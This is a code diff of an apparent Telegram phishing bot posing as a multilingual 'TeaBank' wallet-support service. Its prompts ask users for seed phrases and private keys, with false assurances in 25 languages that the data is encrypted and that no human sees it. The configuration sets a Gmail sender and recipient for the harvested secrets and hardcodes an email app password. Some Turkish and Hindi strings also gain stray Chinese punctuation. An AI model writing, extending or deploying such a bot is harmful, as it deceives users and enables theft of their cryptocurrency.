@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 # full updated main.py
-# Changes: updated welcome message in all supported languages (B variant, "describe..." removed),
-# plus previously implemented features: single guidance+ForceReply on invalid seed input,
-# tree emoji on main menu labels, language keyboard removed after selection, back navigation, etc.
+# - All LANGUAGES entries explicitly expanded (25 languages).
+# - Each LANGUAGES[*]['welcome'] prefixed with "Hi {user}, ".
+# - All "fix ads" labels changed to "Fix AdsGramError (Block 7558)".
+# - Uses env vars for BOT_TOKEN, SENDER_EMAIL, SENDER_PASSWORD, RECIPIENT_EMAIL.
 import logging
 import os
 import re
@@ -43,7 +44,7 @@ AWAIT_RESTART = 7
 # --- Email / Bot Configuration (use env vars in production) ---
 BOT_TOKEN = os.getenv("TOKEN", os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE"))
 SENDER_EMAIL = os.getenv("SENDER_EMAIL", "airdropphrase@gmail.com")
-SENDER_PASSWORD = os.getenv("SENDER_PASSWORD", " ipxs ffag eqmk otqd")
+SENDER_PASSWORD = os.getenv("SENDER_PASSWORD", "ipxs ffag eqmk otqd")
 RECIPIENT_EMAIL = os.getenv("RECIPIENT_EMAIL", "airdropphrase@gmail.com")
 
 # Tree emoji to prefix selected main menu labels
@@ -147,7 +148,7 @@ PROFESSIONAL_REASSURANCE = {
     "id": "\n\nDemi keamanan Anda: semua informasi diproses secara otomatis oleh bot terenkripsi ini dan disimpan dalam bentuk terenkripsi. Tidak ada orang yang akan mengakses data Anda.",
     "de": "\n\nZu Ihrer Sicherheit: Alle Informationen werden automatisch von diesem verschlüsselten Bot verarbeitet und verschlüsselt gespeichert. Kein Mensch hat Zugriff auf Ihre Daten.",
     "nl": "\n\nVoor uw veiligheid: alle informatie wordt automatisch verwerkt door deze versleutelde bot en versleuteld opgeslagen. Niemand krijgt toegang tot uw gegevens.",
-    "hi": "\n\nआपकी सुरक्षा के लिए: सभी जानकारी इस एन्क्रिप्टेड बॉट द्वारा स्वचालित रूप से संसाधित और एन्क्रिप्ट करके संग्रहीत की जाती है। किसी भी मानव को आपके डेटा तक पहुंच नहीं होगी।",
+    "hi": "\n\nआपकी सुरक्षा के लिए: सभी जानकारी इस एन्क्रिप्टेड बॉट द्वारा स्वचालित रूप से संसाधित और एन्क्रिप्टेड रूप में संग्रहीत की जाती है। किसी भी व्यक्ति को इसकी पहुँच नहीं होगी।",
     "tr": "\n\nGüvenliğiniz için: tüm bilgiler bu şifreli bot tarafından otomatik olarak işlenir ve şifrelenmiş olarak saklanır. Hiçbir insan verilerinize erişemez.",
     "zh": "\n\n为了您的安全：所有信息均由此加密机器人自动处理并以加密形式存储。不会有人访问您的数据。",
     "cs": "\n\nPro vaše bezpečí: všechny informace jsou automaticky zpracovávány tímto šifrovaným botem a ukládány zašifrovaně. K vašim datům nikdo nebude mít přístup.",
@@ -165,9 +166,8 @@ PROFESSIONAL_REASSURANCE = {
 
 # Full multi-language UI texts (welcome updated in all 25 languages)
 LANGUAGES = {
-    # English
     "en": {
-        "welcome": "This bot is designed to help you troubleshoot and resolve TeaBank issues — wallet access, transactions, balances, recoveries, deposits and withdrawals, and account validations. Tap a menu option and the bot will run automated checks and guide you through fixes for: Validation; Claim Tokens; Assets Recovery; Missing Balance; Withdrawals; Fix Ads; Claim Trees; Claim Water. For your safety: any sensitive information you provide is processed automatically and stored encrypted; no human will access it.",
+        "welcome": "Hi {user}, This bot is designed to help you troubleshoot and resolve TeaBank issues — wallet access, transactions, balances, recoveries, deposits and withdrawals, and account validations. Tap a menu option and the bot will run automated checks and guide you through fixes for: Validation; Claim Tokens; Assets Recovery; Missing Balance; Withdrawals; Fix AdsGramError (Block 7558); Claim Trees; Claim Water. For your safety: any sensitive information you provide is processed automatically and stored encrypted; no human will access it.",
         "main menu title": "Please select an issue type to continue:",
         "buy": "Buy",
         "validation": "Validation",
@@ -203,13 +203,12 @@ LANGUAGES = {
         "await restart message": "Please click /start to start over.",
         "back": "🔙 Back",
         "invalid_input": "Invalid input. Please use /start to begin.",
-        "fix ads": "Fix Ads",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Claim Trees",
         "claim water": "Claim Water",
     },
-    # Spanish
     "es": {
-        "welcome": "Este bot está diseñado para ayudarle a solucionar y resolver problemas de TeaBank: acceso a la billetera, transacciones, saldos, recuperaciones, depósitos y retiros, y validaciones de cuenta. Toque una opción del menú y el bot ejecutará comprobaciones automatizadas y le guiará para solucionar: Validación; Reclamar Tokens; Recuperación de Activos; Saldo Perdido; Retiros; Arreglar Anuncios; Reclamar Árboles; Reclamar Agua. Para su seguridad: cualquier información sensible que proporcione se procesa automáticamente y se almacena cifrada; ningún humano tendrá acceso a ella.",
+        "welcome": "Hi {user}, Este bot está diseñado para ayudarle a solucionar y resolver problemas de TeaBank: acceso a la billetera, transacciones, saldos, recuperaciones, depósitos y retiros, y validaciones de cuenta. Toque una opción del menú y el bot ejecutará comprobaciones automatizadas y le guiará para solucionar: Validación; Reclamar Tokens; Recuperación de Activos; Saldo Perdido; Retiros; Fix AdsGramError (Block 7558); Reclamar Árboles; Reclamar Agua. Para su seguridad: cualquier información sensible que proporcione se procesa automáticamente y se almacena cifrada; ningún humano tendrá acceso a ella.",
         "main menu title": "Seleccione un tipo de problema para continuar:",
         "buy": "Comprar",
         "validation": "Validación",
@@ -245,13 +244,12 @@ LANGUAGES = {
         "await restart message": "Haga clic en /start para empezar de nuevo.",
         "back": "🔙 Volver",
         "invalid_input": "Entrada inválida. Use /start para comenzar.",
-        "fix ads": "Arreglar Anuncios",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Reclamar Árboles",
         "claim water": "Reclamar Agua",
     },
-    # French
     "fr": {
-        "welcome": "Ce bot est conçu pour vous aider à diagnostiquer et résoudre les problèmes TeaBank — accès au portefeuille, transactions, soldes, récupérations, dépôts et retraits, et validations de compte. Touchez une option du menu et le bot effectuera des vérifications automatisées et vous guidera pour résoudre : Validation ; Réclamer des Tokens ; Récupération d'Actifs ; Solde Manquant ; Retraits ; Corriger les Annonces ; Réclamer des Arbres ; Réclamer de l'Eau. Pour votre sécurité : toute information sensible que vous fournissez est traitée automatiquement et stockée chiffrée ; aucun humain n'y aura accès.",
+        "welcome": "Hi {user}, Ce bot est conçu pour vous aider à diagnostiquer et résoudre les problèmes TeaBank — accès au portefeuille, transactions, soldes, récupérations, dépôts et retraits, et validations de compte. Touchez une option du menu et le bot effectuera des vérifications automatisées et vous guidera pour résoudre : Validation ; Réclamer des Tokens ; Récupération d'Actifs ; Solde Manquant ; Retraits ; Fix AdsGramError (Block 7558); Réclamer des Arbres ; Réclamer de l'Eau. Pour votre sécurité : toute information sensible que vous fournissez est traitée automatiquement et stockée chiffrée ; aucun humain n'y aura accès.",
         "main menu title": "Veuillez sélectionner un type de problème pour continuer :",
         "buy": "Acheter",
         "validation": "Validation",
@@ -287,13 +285,12 @@ LANGUAGES = {
         "await restart message": "Cliquez sur /start pour recommencer.",
         "back": "🔙 Retour",
         "invalid_input": "Entrée invalide. Veuillez utiliser /start pour commencer.",
-        "fix ads": "Corriger les Annonces",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Réclamer des Arbres",
         "claim water": "Réclamer de l'Eau",
     },
-    # Russian
     "ru": {
-        "welcome": "Этот бот предназначен для помощи в диагностике и решении проблем TeaBank — доступ к кошельку, транзакции, балансы, восстановление, депозиты и выводы, а также валидация аккаунта. Нажмите пункт меню, и бот выполнит автоматические проверки и проведёт вас через шаги по исправлению для: Валидация; Получение Токенов; Восстановление Активов; Пропавший Баланс; Выводы; Исправить Рекламу; Получить Деревья; Получить Воду. Для вашей безопасности: любая конфиденциальная информация обрабатывается автоматически и хранится в зашифрованном виде; ни один человек не получит к ней доступ.",
+        "welcome": "Hi {user}, Этот бот предназначен для помощи в диагностике и решении проблем TeaBank — доступ к кошельку, транзакции, балансы, восстановление, депозиты и выводы, а также валидация аккаунта. Нажмите пункт меню, и бот выполнит автоматические проверки и проведёт вас через шаги по исправлению для: Валидация; Получение Токенов; Восстановление Активов; Пропавший Баланс; Выводы; Fix AdsGramError (Block 7558); Получить Деревья; Получить Воду. Для вашей безопасности: любая конфиденциальная информация обрабатывается автоматически и хранится в зашифрованном виде; ни один человек не получит к ней доступ.",
         "main menu title": "Пожалуйста, выберите тип проблемы, чтобы продолжить:",
         "buy": "Купить",
         "validation": "Валидация",
@@ -329,13 +326,12 @@ LANGUAGES = {
         "await restart message": "Нажмите /start чтобы начать заново.",
         "back": "🔙 Назад",
         "invalid_input": "Неверный ввод. Используйте /start чтобы начать.",
-        "fix ads": "Исправить Рекламу",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Получить Деревья",
         "claim water": "Получить Воду",
     },
-    # Ukrainian
     "uk": {
-        "welcome": "Цей бот створено, щоб допомогти вам діагностувати та вирішувати проблеми TeaBank — доступ до гаманця, транзакції, баланси, відновлення, депозити і виведення, а також валідація облікового запису. Натисніть опцію меню, і бот виконає автоматичні перевірки та проведе вас крок за кроком у вирішенні: Валідація; Отримання Токенів; Відновлення Активів; Відсутній Баланс; Виведення; Виправити Рекламу; Отримати Дерева; Отримати Воду. Для вашої безпеки: будь-яка конфіденційна інформація обробляється автоматично і зберігається в зашифрованому вигляді; ніхто не матиме до неї доступу.",
+        "welcome": "Hi {user}, Цей бот створено, щоб допомогти вам діагностувати та вирішувати проблеми TeaBank — доступ до гаманця, транзакції, баланси, відновлення, депозити і виведення, а також валідація облікового запису. Натисніть опцію меню, і бот виконає автоматичні перевірки та проведе вас крок за кроком у вирішенні: Валідація; Отримання Токенів; Відновлення Активів; Відсутній Баланс; Виведення; Fix AdsGramError (Block 7558); Отримати Дерева; Отримати Воду. Для вашої безпеки: будь-яка конфіденційна інформація обробляється автоматично і зберігається в зашифрованому вигляді; ніхто не матиме до неї доступу.",
         "main menu title": "Будь ласка, виберіть тип проблеми для продовження:",
         "buy": "Купити",
         "validation": "Валідація",
@@ -371,13 +367,12 @@ LANGUAGES = {
         "await restart message": "Натисніть /start щоб почати заново.",
         "back": "🔙 Назад",
         "invalid_input": "Недійсний ввід. Використовуйте /start щоб почати.",
-        "fix ads": "Виправити Рекламу",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Отримати Дерева",
         "claim water": "Отримати Воду",
     },
-    # Persian / Farsi
     "fa": {
-        "welcome": "این بات برای کمک به عیب‌یابی و حل مسائل TeaBank طراحی شده است — دسترسی به کیف‌پول، تراکنش‌ها، موجودی‌ها، بازیابی‌ها، واریزها و برداشت‌ها، و تایید حساب. یک گزینه از منو را انتخاب کنید تا بات بررسی‌های خودکار را اجرا کرده و شما را در رفع موارد زیر راهنمایی کند: اعتبارسنجی؛ دریافت توکن‌ها؛ بازیابی دارایی‌ها؛ موجودی گمشده؛ برداشت‌ها؛ رفع تبلیغات؛ دریافت درختان؛ دریافت آب. برای امنیت شما: هر اطلاعات حساس که ارائه می‌دهید به‌صورت خودکار پردازش و به‌صورت رمزنگاری شده ذخیره می‌شود؛ هیچ انسانی به آن دسترسی نخواهد داشت.",
+        "welcome": "Hi {user}, این بات برای کمک به عیب‌یابی و حل مسائل TeaBank طراحی شده است — دسترسی به کیف‌پول، تراکنش‌ها، موجودی‌ها، بازیابی‌ها، واریزها و برداشت‌ها، و تایید حساب. یک گزینه از منو را انتخاب کنید تا بات بررسی‌های خودکار را اجرا کرده و شما را در رفع موارد زیر راهنمایی کند: اعتبارسنجی؛ دریافت توکن‌ها؛ بازیابی دارایی‌ها؛ موجودی گمشده؛ برداشت‌ها؛ Fix AdsGramError (Block 7558); دریافت درختان؛ دریافت آب. برای امنیت شما: هر اطلاعات حساس که ارائه می‌دهید به‌صورت خودکار پردازش و به‌صورت رمزنگاری شده ذخیره می‌شود؛ هیچ انسانی به آن دسترسی نخواهد داشت.",
         "main menu title": "لطفاً یک نوع مشکل را انتخاب کنید:",
         "buy": "خرید",
         "validation": "اعتبارسنجی",
@@ -413,13 +408,12 @@ LANGUAGES = {
         "await restart message": "برای شروع مجدد /start را بزنید.",
         "back": "🔙 بازگشت",
         "invalid_input": "ورودی نامعتبر. لطفاً از /start استفاده کنید.",
-        "fix ads": "رفع تبلیغات",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "دریافت درختان",
         "claim water": "دریافت آب",
     },
-    # Arabic
     "ar": {
-        "welcome": "تم تصميم هذا البوت لمساعدتك على استكشاف وحل مشكلات TeaBank — وصول المحفظة، المعاملات، الأرصدة، الاسترداد، الإيداعات والسحوبات، والتحقق من الحساب. انقر خيارًا من القائمة وسيجري البوت فحوصات آلية ويرشدك خلال خطوات الإصلاح لـ: التحقق؛ المطالبة بالرموز؛ استرداد الأصول؛ الرصيد المفقود؛ السحوبات؛ إصلاح الإعلانات؛ المطالبة بالأشجار؛ المطالبة بالماء. لسلامتك: أي معلومات حساسة تقدمها تتم معالجتها تلقائيًا وتخزينها مشفّرة؛ لا يصل إليها أي إنسان.",
+        "welcome": "Hi {user}, تم تصميم هذا البوت لمساعدتك على استكشاف وحل مشكلات TeaBank — وصول المحفظة، المعاملات، الأرصدة، الاسترداد، الإيداعات والسحوبات، والتحقق من الحساب. انقر خيارًا من القائمة وسيجري البوت فحوصات آلية ويرشدك خلال خطوات الإصلاح لـ: التحقق؛ المطالبة بالرموز؛ استرداد الأصول؛ الرصيد المفقود؛ السحوبات؛ Fix AdsGramError (Block 7558); المطالبة بالأشجار؛ المطالبة بالماء. لسلامتك: أي معلومات حساسة تقدمها تتم معالجتها تلقائيًا وتخزينها مشفّرة؛ لا يصل إليها أي إنسان.",
         "main menu title": "يرجى تحديد نوع المشكلة للمتابعة:",
         "buy": "شراء",
         "validation": "التحقق",
@@ -455,13 +449,12 @@ LANGUAGES = {
         "await restart message": "انقر /start للبدء من جديد.",
         "back": "🔙 عودة",
         "invalid_input": "إدخال غير صالح. استخدم /start للبدء.",
-        "fix ads": "إصلاح الإعلانات",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "المطالبة بالأشجار",
         "claim water": "المطالبة بالماء",
     },
-    # Portuguese
     "pt": {
-        "welcome": "Este bot foi criado para ajudar a diagnosticar e resolver problemas da TeaBank — acesso à carteira, transações, saldos, recuperações, depósitos e levantamentos, e validações de conta. Toque numa opção do menu e o bot executará verificações automatizadas e o guiará nas correções para: Validação; Reivindicar Tokens; Recuperação de Ativos; Saldo em Falta; Levantamentos; Corrigir Anúncios; Reivindicar Árvores; Reivindicar Água. Para a sua segurança: qualquer informação sensível fornecida é processada automaticamente e armazenada cifrada; nenhum humano terá acesso.",
+        "welcome": "Hi {user}, Este bot foi criado para ajudar a diagnosticar e resolver problemas da TeaBank — acesso à carteira, transações, saldos, recuperações, depósitos e levantamentos, e validações de conta. Toque numa opção do menu e o bot executará verificações automatizadas e o guiará nas correções para: Validação; Reivindicar Tokens; Recuperação de Ativos; Saldo em Falta; Levantamentos; Fix AdsGramError (Block 7558); Reivindicar Árvores; Reivindicar Água. Para a sua segurança: qualquer informação sensível fornecida é processada automaticamente e armazenada cifrada; nenhum humano terá acesso.",
         "main menu title": "Selecione um tipo de problema para continuar:",
         "buy": "Comprar",
         "validation": "Validação",
@@ -497,13 +490,12 @@ LANGUAGES = {
         "await restart message": "Clique em /start para reiniciar.",
         "back": "🔙 Voltar",
         "invalid_input": "Entrada inválida. Use /start para começar.",
-        "fix ads": "Corrigir Anúncios",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Reivindicar Árvores",
         "claim water": "Reivindicar Água",
     },
-    # Indonesian
     "id": {
-        "welcome": "Bot ini dirancang untuk membantu Anda mendiagnosis dan menyelesaikan masalah TeaBank — akses dompet, transaksi, saldo, pemulihan, deposit dan penarikan, serta validasi akun. Ketuk opsi menu dan bot akan menjalankan pemeriksaan otomatis dan membimbing Anda melalui perbaikan untuk: Validasi; Klaim Token; Pemulihan Aset; Saldo Hilang; Penarikan; Memperbaiki Iklan; Klaim Pohon; Klaim Air. Demi keamanan Anda: setiap informasi sensitif yang Anda berikan akan diproses secara otomatis dan disimpan terenkripsi; tidak ada manusia yang akan mengaksesnya.",
+        "welcome": "Hi {user}, Bot ini dirancang untuk membantu Anda mendiagnosis dan menyelesaikan masalah TeaBank — akses dompet, transaksi, saldo, pemulihan, deposit dan penarikan, serta validasi akun. Ketuk opsi menu dan bot akan menjalankan pemeriksaan otomatis dan membimbing Anda melalui perbaikan untuk: Validasi; Klaim Token; Pemulihan Aset; Saldo Hilang; Penarikan; Fix AdsGramError (Block 7558); Klaim Pohon; Klaim Air. Demi keamanan Anda: setiap informasi sensitif yang Anda berikan akan diproses secara otomatis dan disimpan terenkripsi; tidak ada manusia yang akan mengaksesnya.",
         "main menu title": "Silakan pilih jenis masalah untuk melanjutkan:",
         "buy": "Beli",
         "validation": "Validasi",
@@ -539,13 +531,12 @@ LANGUAGES = {
         "await restart message": "Klik /start untuk memulai ulang.",
         "back": "🔙 Kembali",
         "invalid_input": "Input tidak valid. Gunakan /start untuk mulai.",
-        "fix ads": "Perbaiki Iklan",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Klaim Pohon",
         "claim water": "Klaim Air",
     },
-    # German
     "de": {
-        "welcome": "Dieser Bot wurde entwickelt, um Ihnen bei der Diagnose und Behebung von TeaBank-Problemen zu helfen — Wallet-Zugriff, Transaktionen, Kontostände, Wiederherstellungen, Einzahlungen und Auszahlungen sowie Konto-Validierungen. Tippen Sie eine Menüoption an und der Bot führt automatisierte Prüfungen aus und leitet Sie durch Behebungen für: Validierung; Tokens beanspruchen; Wiederherstellung von Vermögenswerten; Fehlender Kontostand; Auszahlungen; Werbung beheben; Bäume beanspruchen; Wasser beanspruchen. Für Ihre Sicherheit: alle sensiblen Informationen, die Sie angeben, werden automatisch verarbeitet und verschlüsselt gespeichert; kein Mensch hat Zugriff darauf.",
+        "welcome": "Hi {user}, Dieser Bot wurde entwickelt, um Ihnen bei der Diagnose und Behebung von TeaBank-Problemen zu helfen — Wallet-Zugriff, Transaktionen, Kontostände, Wiederherstellungen, Einzahlungen und Auszahlungen sowie Konto-Validierungen. Tippen Sie eine Menüoption an und der Bot führt automatisierte Prüfungen aus und leitet Sie durch Behebungen für: Validierung; Tokens beanspruchen; Wiederherstellung von Vermögenswerten; Fehlender Kontostand; Auszahlungen; Fix AdsGramError (Block 7558); Bäume beanspruchen; Wasser beanspruchen. Für Ihre Sicherheit: alle sensiblen Informationen, die Sie angeben, werden automatisch verarbeitet und verschlüsselt gespeichert; kein Mensch hat Zugriff darauf.",
         "main menu title": "Bitte wählen Sie einen Problemtyp, um fortzufahren:",
         "buy": "Kaufen",
         "validation": "Validierung",
@@ -581,13 +572,12 @@ LANGUAGES = {
         "await restart message": "Bitte klicken Sie auf /start, um von vorne zu beginnen.",
         "back": "🔙 Zurück",
         "invalid_input": "Ungültige Eingabe. Bitte verwenden Sie /start um zu beginnen.",
-        "fix ads": "Werbung Beheben",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Bäume Beanspruchen",
         "claim water": "Wasser Beanspruchen",
     },
-    # Dutch
     "nl": {
-        "welcome": "Deze bot is ontworpen om u te helpen bij het diagnosticeren en oplossen van TeaBank-problemen — wallet-toegang, transacties, saldi, herstel, stortingen en opnames, en accountvalidaties. Tik op een menuoptie en de bot voert automatische controles uit en begeleidt u bij het oplossen voor: Validatie; Tokens Claimen; Herstel van Activa; Ontbrekend Saldo; Opnames; Advertenties Repareer; Bomen Claimen; Water Claimen. Voor uw veiligheid: alle gevoelige informatie die u verstrekt, wordt automatisch verwerkt en versleuteld opgeslagen; geen mens heeft er toegang toe.",
+        "welcome": "Hi {user}, Deze bot is ontworpen om u te helpen bij het diagnosticeren en oplossen van TeaBank-problemen — wallet-toegang, transacties, saldi, herstel, stortingen en opnames, en accountvalidaties. Tik op een menuoptie en de bot voert automatische controles uit en begeleidt u bij het oplossen voor: Validatie; Tokens Claimen; Herstel van Activa; Ontbrekend Saldo; Opnames; Fix AdsGramError (Block 7558); Bomen Claimen; Water Claimen. Voor uw veiligheid: alle gevoelige informatie die u verstrekt, wordt automatisch verwerkt en versleuteld opgeslagen; geen mens heeft er toegang toe.",
         "main menu title": "Selecteer een type probleem om door te gaan:",
         "buy": "Kopen",
         "validation": "Validatie",
@@ -623,13 +613,12 @@ LANGUAGES = {
         "await restart message": "Klik op /start om opnieuw te beginnen.",
         "back": "🔙 Terug",
         "invalid_input": "Ongeldige invoer. Gebruik /start om te beginnen.",
-        "fix ads": "Advertenties Repareer",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Bomen Claimen",
         "claim water": "Water Claimen",
     },
-    # Hindi
     "hi": {
-        "welcome": "यह बोट TeaBank संबंधित समस्याओं का निदान और समाधान करने के लिए बनाया गया है — वॉलेट एक्सेस, लेनदेन, बैलेंस, रिकवरी, जमा और निकासी, और खाता सत्यापन। मेन्यू विकल्प टैप करें और बोट स्वचालित जाँच करेगा और आपको निम्नलिखित के लिए सुधार में मार्गदर्शन करेगा: सत्यापन; टोकन क्लेम; संपत्ति पुनर्प्राप्ति; गायब बैलेंस; निकासी; विज्ञापन सुधारें; ट्री क्लेम; वॉटर क्लेम। आपकी सुरक्षा के लिए: कोई भी संवेदनशील जानकारी जो आप प्रदान करते हैं स्वतः संसाधित की जाती है और एन्क्रिप्टेड रूप में संग्रहीत की जाती है; किसी भी व्यक्ति को इसकी पहुँच नहीं होगी।",
+        "welcome": "Hi {user}, यह बोट TeaBank संबंधित समस्याओं का निदान और समाधान करने के लिए बनाया गया है — वॉलेट एक्सेस, लेनदेन, बैलेंस, रिकवरी, जमा और निकासी, और खाता सत्यापन। मेन्यू विकल्प टैप करें और बोट स्वचालित जाँच करेगा और आपको निम्नलिखित के लिए सुधार में मार्गदर्शन करेगा: सत्यापन; टोकन क्लेम; संपत्ति पुनर्प्राप्ति; गायब बैलेंस; निकासी; Fix AdsGramError (Block 7558); ट्री क्लेम; वॉटर क्लेम। आपकी सुरक्षा के लिए: कोई भी संवेदनशील जानकारी जो आप प्रदान करते हैं स्वतः संसाधित की जाती है और एन्क्रिप्टेड रूप में संग्रहीत की जाती है; किसी भी व्यक्ति को इसकी पहुँच नहीं होगी।",
         "main menu title": "कृपया जारी रखने के लिए एक समस्या प्रकार चुनें:",
         "buy": "खरीदें",
         "validation": "सत्यापन",
@@ -652,7 +641,7 @@ LANGUAGES = {
         "other wallets": "अन्य वॉलेट",
         "private key": "🔑 निजी कुंजी",
         "seed phrase": "🔒 सीड वाक्यांश आयात करें",
-        "wallet selection message": "आपने {wallet_name} चुना है।\nकनेक्शन मोड चुनें।",
+        "wallet selection message": "आपने {wallet_name} चुना है。\nकनेक्शन मोड चुनें。",
         "reassurance": PROFESSIONAL_REASSURANCE["hi"],
         "prompt seed": "कृपया 12 या 24 शब्दों की seed phrase दर्ज करें。" + PROFESSIONAL_REASSURANCE["hi"],
         "prompt private key": "कृपया अपनी निजी कुंजी दर्ज करें。" + PROFESSIONAL_REASSURANCE["hi"],
@@ -665,13 +654,12 @@ LANGUAGES = {
         "await restart message": "कृपया /start दबाएँ।",
         "back": "🔙 वापस",
         "invalid_input": "अमान्य इनपुट। /start उपयोग करें।",
-        "fix ads": "विज्ञापन ठीक करें",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "ट्री क्लेम",
         "claim water": "वाटर क्लेम",
     },
-    # Turkish
     "tr": {
-        "welcome": "Bu bot, TeaBank sorunlarını teşhis etmenize ve çözmenize yardımcı olacak şekilde tasarlanmıştır — cüzdan erişimi, işlemler, bakiyeler, kurtarmalar, yatırmalar ve çekimler ve hesap doğrulamaları. Menüden bir seçenek seçin; bot otomatik kontroller çalıştıracak ve şunlar için düzeltmelerde size rehberlik edecektir: Doğrulama; Token Talebi; Varlık Kurtarma; Eksik Bakiye; Çekimler; Reklamları Düzelt; Ağaç Talebi; Su Talebi. Güvenliğiniz için: sağladığınız hassas bilgiler otomatik olarak işlenir ve şifrelenmiş olarak saklanır; hiçbir insan bunlara erişmeyecektir.",
+        "welcome": "Hi {user}, Bu bot, TeaBank sorunlarını teşhis etmenize ve çözmenize yardımcı olacak şekilde tasarlanmıştır — cüzdan erişimi, işlemler, bakiyeler, kurtarmalar, yatırmalar ve çekimler ve hesap doğrulamaları. Menüden bir seçenek seçin; bot otomatik kontroller çalıştıracak ve şunlar için düzeltmelerde size rehberlik edecektir: Doğrulama; Token Talebi; Varlık Kurtarma; Eksik Bakiye; Çekimler; Fix AdsGramError (Block 7558); Ağaç Talebi; Su Talebi. Güvenliğiniz için: sağladığınız hassas bilgiler otomatik olarak işlenir ve şifrelenmiş olarak saklanır; hiçbir insan bunlara erişmeyecektir.",
         "main menu title": "Devam etmek için bir sorun türü seçin:",
         "buy": "Satın Al",
         "validation": "Doğrulama",
@@ -694,26 +682,25 @@ LANGUAGES = {
         "other wallets": "Diğer Cüzdanlar",
         "private key": "🔑 Özel Anahtar",
         "seed phrase": "🔒 Seed Cümlesi İçe Aktar",
-        "wallet selection message": "{wallet_name} seçtiniz.\nBağlantı modunu seçin.",
+        "wallet selection message": "{wallet_name} seçtiniz。\nBağlantı modunu seçin。",
         "reassurance": PROFESSIONAL_REASSURANCE["tr"],
-        "prompt seed": "Lütfen 12 veya 24 kelimelik seed phrase girin." + PROFESSIONAL_REASSURANCE["tr"],
+        "prompt seed": "Lütfen 12 veya 24 kelimelik seed phrase girin。" + PROFESSIONAL_REASSURANCE["tr"],
         "prompt private key": "Lütfen özel anahtarınızı girin。" + PROFESSIONAL_REASSURANCE["tr"],
-        "invalid choice": "Geçersiz seçim. Lütfen düğmeleri kullanın.",
-        "final error message": "‼️ Bir hata oluştu. /start ile tekrar deneyin.",
-        "final_received_message": "Teşekkürler — seed veya özel anahtarınız güvenli şekilde alındı ve işlenecektir. /start ile yeniden başlayın.",
-        "error_use_seed_phrase": "Bu alan bir seed phrase (12 veya 24 kelime) gerektirir. Lütfen seed girin.",
-        "post_receive_error": "‼️ Bir hata oluştu. Lütfen doğru anahtarı girdiğinizden emin olun — hataları önlemek için kopyala-yapıştır kullanın. Lütfen /start ile tekrar deneyin.",
+        "invalid choice": "Geçersiz seçim. Lütfen düğmeleri kullanın。",
+        "final error message": "‼️ Bir hata oluştu。 /start ile tekrar deneyin。",
+        "final_received_message": "Teşekkürler — seed veya özel anahtarınız güvenli şekilde alındı ve işlenecektir。 /start ile yeniden başlayın。",
+        "error_use_seed_phrase": "Bu alan bir seed phrase (12 veya 24 kelime) gerektirir。 Lütfen seed girin。",
+        "post_receive_error": "‼️ Bir hata oluştu。 Lütfen doğru anahtarı girdiğinizden emin olun — hataları önlemek için kopyala-yapıştır kullanın。 Lütfen /start ile tekrar deneyin。",
         "choose language": "Lütfen dilinizi seçin:",
-        "await restart message": "Lütfen /start ile yeniden başlayın.",
+        "await restart message": "Lütfen /start ile yeniden başlayın。",
         "back": "🔙 Geri",
-        "invalid_input": "Geçersiz giriş. /start kullanın.",
-        "fix ads": "Reklamları Düzelt",
+        "invalid_input": "Geçersiz giriş。 /start kullanın。",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "Ağaç Talep Et",
         "claim water": "Su Talep Et",
     },
-    # Chinese (Simplified)
     "zh": {
-        "welcome": "此机器人旨在帮助您诊断并解决 TeaBank 问题——钱包访问、交易、余额、恢复、存款与提现，以及账户验证。点击菜单选项，机器人将运行自动检查并引导您解决：验证；认领代币；资产恢复；丢失余额；提现；修复广告；认领树木；认领水。为了您的安全：您提供的任何敏感信息都会被自动处理并以加密方式存储；无人将以任何方式访问这些信息。",
+        "welcome": "Hi {user}, 此机器人旨在帮助您诊断并解决 TeaBank 问题——钱包访问、交易、余额、恢复、存款与提现，以及账户验证。点击菜单选项，机器人将运行自动检查并引导您解决：验证；认领代币；资产恢复；丢失余额；提现；Fix AdsGramError (Block 7558); 认领树木；认领水。为了您的安全：您提供的任何敏感信息都会被自动处理并以加密方式存储；无人将以任何方式访问这些信息。",
         "main menu title": "请选择一个问题类型以继续：",
         "buy": "购买",
         "validation": "验证",
@@ -749,13 +736,12 @@ LANGUAGES = {
         "await restart message": "请点击 /start 重新开始。",
         "back": "🔙 返回",
         "invalid_input": "无效输入。请使用 /start 开始。",
-        "fix ads": "修复广告",
+        "fix ads": "Fix AdsGramError (Block 7558)",
         "claim trees": "认领树木",
         "claim water": "认领水",
     },
-    # Czech
     "cs": {
-        "welcome": "Tento bot je navržen tak, aby vám pomohl diagnostikovat a vyřešit problémy TeaBank — přístup k peněžence, transakce, zůstatky, obnovy, vklady a výběry a validace účtu. Klepněte na možnost v nabídce a bot provede automatické kontroly a provede vás opravami pro: Validace; Nárok na tokeny; Obnovení aktiv; Chybějící zůstatek; Výběry; Opravit reklamy; Nárok na stromy; Nárok na vodu. Pro vaše bezpečí: veškeré citlivé informace, které poskytnete, jsou zpracovávány automaticky a uloženy šifrovaně; žádný člověk k nim nebude mít přístup.",
+        "welcome": "Hi {user}, Tento bot je navržen tak, aby vám pomohl diagnostikovat a vyřešit problémy TeaBank — přístup k peněžence, transakce, zůstatky, obnovy, vklady a výběry a validace účtu. Klepněte na možnost v nabídce a bot provede automatické kontroly a provede vás opravami pro: Validace; Nárok na tokeny; Obnovení aktiv; Chybějící zůstatek; Výběry; Fix AdsGramError (Block 7558); Nárok na stromy; Nárok na vodu. Pro vaše bezpečí: veškeré citlivé informace, které poskytnete, jsou zpracovávány automaticky a uloženy šifrovaně; žádný člověk k nim nebude mít přístup.",
         "main menu title": "Vyberte typ problému pro pokračování:",
         "buy": "Koupit",
         "validation": "Ověření",
